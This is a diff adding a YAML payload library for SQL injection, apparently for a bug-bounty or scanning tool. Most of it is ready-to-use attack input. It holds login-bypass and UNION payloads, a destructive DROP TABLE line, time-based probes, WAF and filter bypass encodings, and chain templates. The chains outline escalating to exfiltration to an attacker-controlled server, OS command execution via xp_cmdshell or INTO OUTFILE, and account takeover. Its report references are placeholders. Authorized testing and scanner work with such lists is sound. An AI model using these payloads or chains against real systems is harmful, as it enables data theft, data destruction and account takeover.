@@ -1,0 +1,136 @@
+name: SQL Injection
+description: >
+  SQL injection (SQLi) is a code injection technique that exploits security
+  vulnerabilities in an application's database layer.
+
+basic_payloads:
+  - "' OR '1'='1"
+  - "' OR '1'='1' --"
+  - "' OR '1'='1' #"
+  - "' OR '1'='1' /*"
+  - "admin' --"
+  - "admin' #"
+  - "' UNION SELECT NULL--"
+  - "' UNION SELECT NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL--"
+  - "' AND 1=1--"
+  - "' AND 1=2--"
+  - "1' ORDER BY 1--"
+  - "1' ORDER BY 100--"
+  - "'; DROP TABLE users--"
+  - "' WAITFOR DELAY '0:0:5'--"
+  - "1 AND SLEEP(5)"
+  - "1' AND SLEEP(5)--"
+  - "1; SELECT pg_sleep(5)--"
+  - "\" OR \"1\"=\"1"
+  - "1 UNION SELECT @@version"
+  - "' UNION SELECT database()--"
+
+bypass_techniques:
+  - name: Comment Injection
+    description: Inject SQL comments to truncate queries
+    payloads:
+      - "' OR '1'='1' --"
+      - "' OR 1=1 /*"
+      - "admin'--"
+      - "' UNION SELECT null,version()#"
+
+  - name: Case Variation
+    description: Vary keyword case to bypass simple filters
+    payloads:
+      - "' UNIoN SELeCT 1,2--"
+      - "' oR '1'='1"
+      - "1' OrDer By 3--"
+
+  - name: URL Encoding
+    description: Double URL-encode payloads to bypass WAF
+    payloads:
+      - "%27%20OR%20%271%27%3D%271"
+      - "%25%32%37%20%4f%52%20%31%3d%31--"
+
+  - name: Hex Encoding
+    description: Use hex-encoded values for string comparisons
+    payloads:
+      - "' OR 1=1 --"
+      - "0x27 OR 1=1--"
+      - "' UNION SELECT 0x61646d696e--"
+
+  - name: Null Byte Injection
+    description: Inject null bytes to terminate strings
+    payloads:
+      - "' OR '1'='1'%00"
+      - "admin%00' --"
+
+  - name: Unicode Normalization
+    description: Use Unicode homoglyphs to bypass filters
+    payloads:
+      - "ˈ OR ˈ1ˈ=ˈ1"
+      - "᾽ OR ᾽1᾽=᾽1"
+
+  - name: No-Comment Variant
+    description: Use closing quote without comment syntax
+    payloads:
+      - "' OR '1'='1"
+      - "' UNION SELECT 1,2 WHERE '1'='1"
+
+  - name: Operator Substitution
+    description: Replace = with LIKE, IN, BETWEEN, etc.
+    payloads:
+      - "' OR 1 LIKE 1--"
+      - "' OR 1 IN (1)--"
+      - "' OR 1 BETWEEN 0 AND 2--"
+
+detection_patterns:
+  - "you have an error in your sql syntax"
+  - "warning: mysql"
+  - "unclosed quotation mark"
+  - "odbc drivers"
+  - "microsoft ole db"
+  - "postgresql error"
+  - "driver error"
+  - "sqlite3"
+  - "sqlstate"
+  - "ora-[0-9]"
+  - "plsql"
+  - "mysql_fetch"
+  - "pg_exec"
+  - "sqlite_open"
+  - "incorrect syntax near"
+
+chain_templates:
+  - name: SQLi -> Data Exfil
+    description: Chain SQL injection with out-of-band exfiltration via DNS/HTTP
+    requirements: [sqli, outbound_connectivity]
+    steps:
+      - Confirm SQL injection with time-based payload
+      - Extract database version
+      - Enumerate tables via UNION queries
+      - Use LOAD_FILE or bulk insert for file read
+      - Exfil via DNS/HTTP request to attacker-controlled server
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+  - name: SQLi -> RCE
+    description: Escalate SQL injection to remote code execution via xp_cmdshell or INTO OUTFILE
+    requirements: [sqli, mssql_or_mysql]
+    steps:
+      - Confirm SQLi with error-based detection
+      - Check database user privileges
+      - Enable xp_cmdshell (MSSQL) or INTO OUTFILE (MySQL)
+      - Execute OS commands
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+  - name: SQLi -> Auth Bypass -> ATO
+    description: Use SQLi to bypass authentication and achieve account takeover
+    requirements: [sqli, login_endpoint]
+    steps:
+      - Test login endpoint for SQL injection
+      - Try universal auth bypass payloads
+      - Extract user session after bypass
+      - Access protected endpoints
+    h1_references: ["https://hackerone.com/reports/XXXXX"]
+
+h1_references:
+  - report_id: "XXXXX"
+    title: "SQL Injection in login parameter"
+    technique: "Error-based SQLi"
+    severity: "critical"
